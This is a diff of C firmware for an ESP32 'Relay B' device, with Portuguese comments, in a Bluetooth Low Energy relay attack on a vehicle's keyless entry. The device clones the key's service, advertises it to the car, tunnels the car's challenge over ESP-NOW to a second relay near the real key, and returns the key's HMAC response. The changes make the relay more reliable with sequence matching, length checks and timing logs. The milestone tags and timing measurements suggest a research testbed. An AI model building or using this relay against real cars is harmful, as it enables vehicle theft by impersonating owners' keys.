@@ -3,8 +3,11 @@
  *
  * Papel no ataque:
  *   - clona o servico da chave e anuncia, para o veiculo conectar nele;
- *   - quando o veiculo escreve o desafio, manda o nonce por ESP-NOW (LINK_MSG_CHALLENGE);
- *   - quando chega a resposta do Relay A (LINK_MSG_RESPONSE), notifica o veiculo.
+ *   - quando o veiculo escreve o desafio, atribui um seq (rodada) e manda [seq][nonce]
+ *     por ESP-NOW (LINK_MSG_CHALLENGE);
+ *   - quando chega a resposta do Relay A (LINK_MSG_RESPONSE: [seq][turnaround A][HMAC]),
+ *     so entrega ao veiculo se o seq for o do desafio pendente. Resposta atrasada ou
+ *     duplicada e descartada e contada em "atrasadas" (M-04).
  *
  * Duas metades:
  *   - SELFTEST (RELAY_LINK_SELFTEST 1): Milestone 1, sem BLE. O Relay B faz o papel de
@@ -23,7 +26,11 @@
 #include "relay_config.h"
 #include "link.h"
 #include "ble_contract.h"
+#include "ble_link_params.h"
+#include "run_meta.h"
 
+#include <stdbool.h>
+#include <stdint.h>
 #include <string.h>
 #include "esp_log.h"
 #include "esp_timer.h"
@@ -62,10 +69,13 @@ static void relay_b_ui_init(void)
     cyd_ui_set_field(F_RTT, "-");
 }
 
-/* TODO(BLE) virou implementacao: chamado quando o veiculo escreve em CHALLENGE. */
-static inline void forward_challenge(const uint8_t *nonce, size_t len)
+/* Frame B -> A: [seq][nonce]. O seq e a rodada atribuida por B; A devolve o mesmo seq. */
+static inline void forward_challenge(uint32_t seq, const uint8_t *nonce)
 {
-    link_send(LINK_MSG_CHALLENGE, nonce, len);
+    uint8_t frame[LINK_CHAL_LEN];
+    memcpy(frame, &seq, LINK_SEQ_LEN);
+    memcpy(frame + LINK_SEQ_LEN, nonce, NONCE_LEN);
+    link_send(LINK_MSG_CHALLENGE, frame, sizeof frame);
 }
 
 #if RELAY_LINK_SELFTEST
@@ -80,7 +90,7 @@ static void selftest_fire(void *arg)
     uint8_t nonce[NONCE_LEN] = {0};
     memcpy(nonce, &st_seq, sizeof st_seq);   /* nonce = contador, so para o teste */
     st_tx_us = esp_timer_get_time();
-    link_send(LINK_MSG_CHALLENGE, nonce, NONCE_LEN);
+    forward_challenge(st_seq, nonce);
     st_seq++;
     cyd_ui_set_field(F_VEIC, "%lu", (unsigned long) st_seq);
     esp_timer_start_once(st_timer, 1000000); /* 1 s */
@@ -112,11 +122,18 @@ static uint8_t  last_response[RESPONSE_LEN];     /* ultima resposta (p/ leitura 
  * (4 bytes) correlaciona a rodada com os logs do veiculo, do Relay A e da chave. */
 static int64_t  s_t_chal_us;
 static uint8_t  s_nonce4[4];
-static uint32_t s_round;
 
-/* Fila veiculo<-tunel: resposta a notificar, preenchida no callback ESP-NOW (task WiFi)
- * e consumida pela task notify_worker (que pode chamar a API GATT com seguranca). */
-typedef struct { uint8_t data[RESPONSE_LEN]; uint8_t len; } notify_item_t;
+/* Rodada (seq) atribuida ao ultimo desafio do veiculo, e se ainda aguarda resposta.
+ * Escritos na task do host (write do veiculo) e lidos na notify_worker. */
+static volatile uint32_t s_round;
+static volatile uint32_t s_pending_seq;
+static volatile bool     s_pending_open;
+static volatile uint32_t s_late;                /* respostas atrasadas/duplicadas descartadas */
+static uint32_t s_desconexoes;                  /* quedas da conexao com o veiculo (M-12) */
+
+/* Fila veiculo<-tunel: seq + resposta + turnaround de A, preenchida no callback ESP-NOW
+ * (task WiFi) e consumida pela task notify_worker (que pode chamar a API GATT). */
+typedef struct { uint32_t seq; uint32_t turn_a_us; uint8_t data[RESPONSE_LEN]; } notify_item_t;
 static QueueHandle_t notify_q;
 
 static int  gap_event(struct ble_gap_event *event, void *arg);
@@ -134,15 +151,18 @@ static int gatt_access(uint16_t conn_handle, uint16_t attr_handle,
             uint8_t nonce[NONCE_LEN];
             uint16_t olen = 0;
             int rc = ble_hs_mbuf_to_flat(ctxt->om, nonce, sizeof nonce, &olen);
-            if (rc != 0) return BLE_ATT_ERR_UNLIKELY;
+            if (rc != 0 || olen != NONCE_LEN) return BLE_ATT_ERR_UNLIKELY;
             s_t_chal_us = esp_timer_get_time();
             memcpy(s_nonce4, nonce, 4);
             s_round++;
+            /* A resposta so vale para este seq: marca o pendente ANTES de mandar o frame. */
+            s_pending_seq = s_round;
+            s_pending_open = true;
             ESP_LOGI(TAG, "HOP B rx_chal rodada=%lu nonce=%02x%02x%02x%02x t=%lld us",
                      (unsigned long) s_round, nonce[0], nonce[1], nonce[2], nonce[3],
                      (long long) s_t_chal_us);
             ESP_LOGI(TAG, "desafio do veiculo (%u B) -> tunel", olen);
-            forward_challenge(nonce, olen);
+            forward_challenge(s_round, nonce);
             s_from_vehicle++;
             cyd_ui_set_field(F_VEIC, "%lu", (unsigned long) s_from_vehicle);
             cyd_ui_pulse();
@@ -228,6 +248,7 @@ static int gap_event(struct ble_gap_event *event, void *arg)
         if (event->connect.status == 0) {
             g_conn = event->connect.conn_handle;
             ESP_LOGI(TAG, "veiculo conectado (handle %u)", g_conn);
+            ble_link_log_conn(TAG, g_conn);                                    /* M-10 */
             cyd_ui_set_state("veiculo conectado", 0x1AA260);
         } else {
             ESP_LOGE(TAG, "conexao falhou (status=%d); re-anuncio", event->connect.status);
@@ -236,10 +257,22 @@ static int gap_event(struct ble_gap_event *event, void *arg)
         break;
 
     case BLE_GAP_EVENT_DISCONNECT:
-        ESP_LOGI(TAG, "veiculo desconectou (reason=%d); re-anuncio", event->disconnect.reason);
+        s_desconexoes++;                                                  /* M-12 */
+        ESP_LOGW(TAG, "veiculo desconectou (reason=%d, desconexoes=%lu); re-anuncio",
+                 event->disconnect.reason, (unsigned long) s_desconexoes);
         g_conn = BLE_HS_CONN_HANDLE_NONE;
+        s_pending_open = false;   /* a rodada em voo nao sera entregue a ninguem */
         cyd_ui_set_state("anunciando clone", ACCENT);
         start_advertising();
+        break;
+
+    case BLE_GAP_EVENT_CONN_UPDATE:                                       /* M-10 */
+        if (event->conn_update.status == 0)
+            ble_link_log_conn(TAG, event->conn_update.conn_handle);
+        break;
+
+    case BLE_GAP_EVENT_MTU:                                               /* M-11 */
+        ble_link_log_mtu(TAG, event->mtu.conn_handle, event->mtu.value);
         break;
 
     case BLE_GAP_EVENT_SUBSCRIBE:
@@ -265,34 +298,49 @@ static void notify_worker(void *arg)
     for (;;) {
         if (xQueueReceive(notify_q, &it, portMAX_DELAY) != pdTRUE) continue;
 
+        /* M-04: so entrega a resposta do desafio pendente (mesmo seq). Resposta atrasada
+         * (chegou depois do timeout do veiculo) ou duplicada cai aqui e nao vai ao veiculo. */
+        if (!s_pending_open || it.seq != s_pending_seq) {
+            s_late++;
+            ESP_LOGW(TAG, "resposta da rodada %lu descartada (pendente=%s, atual=%lu); atrasadas=%lu",
+                     (unsigned long) it.seq, s_pending_open ? "sim" : "nao",
+                     (unsigned long) s_pending_seq, (unsigned long) s_late);
+            continue;
+        }
+        s_pending_open = false;
+
         if (g_conn == BLE_HS_CONN_HANDLE_NONE) {
             ESP_LOGW(TAG, "resposta chegou sem veiculo conectado; descarto");
             continue;
         }
         memcpy(last_response, it.data, RESPONSE_LEN);
 
-        struct os_mbuf *om = ble_hs_mbuf_from_flat(it.data, it.len);
+        struct os_mbuf *om = ble_hs_mbuf_from_flat(it.data, RESPONSE_LEN);
         if (om == NULL) { ESP_LOGE(TAG, "sem mbuf para notify"); continue; }
 
         int rc = ble_gatts_notify_custom(g_conn, h_response_val, om);  /* consome o mbuf */
         if (rc != 0) ESP_LOGE(TAG, "notify rc=%d", rc);
-        else ESP_LOGI(TAG, "resposta (%u B) notificada ao veiculo", it.len);
+        else ESP_LOGI(TAG, "resposta (%u B) notificada ao veiculo", RESPONSE_LEN);
 
         /* Turnaround local de B (desafio recebido -> resposta notificada): tunel + lado
-         * da chave. Uma linha CSVB parseavel por rodada, correlacionada pelo nonce. */
+         * da chave. Uma linha CSVB parseavel por rodada, correlacionada pelo seq e pelo
+         * nonce. Ultima coluna = turnaround de A (M-05), para decompor a rodada. */
         int64_t turn = esp_timer_get_time() - s_t_chal_us;
         int8_t rssi = 0;
         ble_gap_conn_rssi(g_conn, &rssi);
         ESP_LOGI(TAG, "HOP B tx_resp rodada=%lu nonce=%02x%02x%02x%02x turnaround=%lld us rssi=%d dBm",
-                 (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
+                 (unsigned long) it.seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
                  (long long) turn, rssi);
-        ESP_LOGI(TAG, "CSVB,%lu,%02x%02x%02x%02x,%lld,%d",
-                 (unsigned long) s_round, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
-                 (long long) turn, rssi);
+        uint32_t tx_falhas = 0;
+        link_tx_stats(&tx_falhas, NULL);                                   /* M-07 */
+        ESP_LOGI(TAG, "CSVB,%lu,%02x%02x%02x%02x,%lld,%d,%lu,%lu",
+                 (unsigned long) it.seq, s_nonce4[0], s_nonce4[1], s_nonce4[2], s_nonce4[3],
+                 (long long) turn, rssi, (unsigned long) it.turn_a_us,
+                 (unsigned long) tx_falhas);
 
         s_from_tunnel++;
         cyd_ui_set_field(F_TUNEL, "%lu", (unsigned long) s_from_tunnel);
-        cyd_ui_set_hex(0, it.data, it.len);
+        cyd_ui_set_hex(0, it.data, RESPONSE_LEN);
         cyd_ui_pulse();
     }
 }
@@ -336,10 +384,17 @@ static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
     }
 #else
     {
+        /* Formato [seq][turnaround A][HMAC]: outro tamanho e lixo, nao vai ao veiculo. */
+        if (len != LINK_RESP_LEN) {
+            ESP_LOGW(TAG, "resposta do tunel com %u B (esperado %d); descarto",
+                     (unsigned) len, LINK_RESP_LEN);
+            break;
+        }
         /* Enfileira para a task worker notificar o veiculo (nao fazer GATT aqui). */
         notify_item_t it;
-        it.len = (len > RESPONSE_LEN) ? RESPONSE_LEN : (uint8_t) len;
-        memcpy(it.data, data, it.len);
+        memcpy(&it.seq, data, LINK_SEQ_LEN);
+        memcpy(&it.turn_a_us, data + LINK_SEQ_LEN, 4);
+        memcpy(it.data, data + LINK_SEQ_LEN + 4, RESPONSE_LEN);
         if (xQueueSend(notify_q, &it, 0) != pdTRUE)
             ESP_LOGW(TAG, "fila de notify cheia; descarto resposta");
     }
@@ -353,6 +408,7 @@ static void on_link_rx(link_msg_type_t type, const uint8_t *data, size_t len)
 void relay_b_start(void)
 {
     relay_b_ui_init();
+    run_meta_print("relay-b");                                            /* M-13b */
 #if RELAY_LINK_SELFTEST
     cyd_ui_set_state("selfteste do tunel", ACCENT);
     ESP_ERROR_CHECK(link_init(on_link_rx));
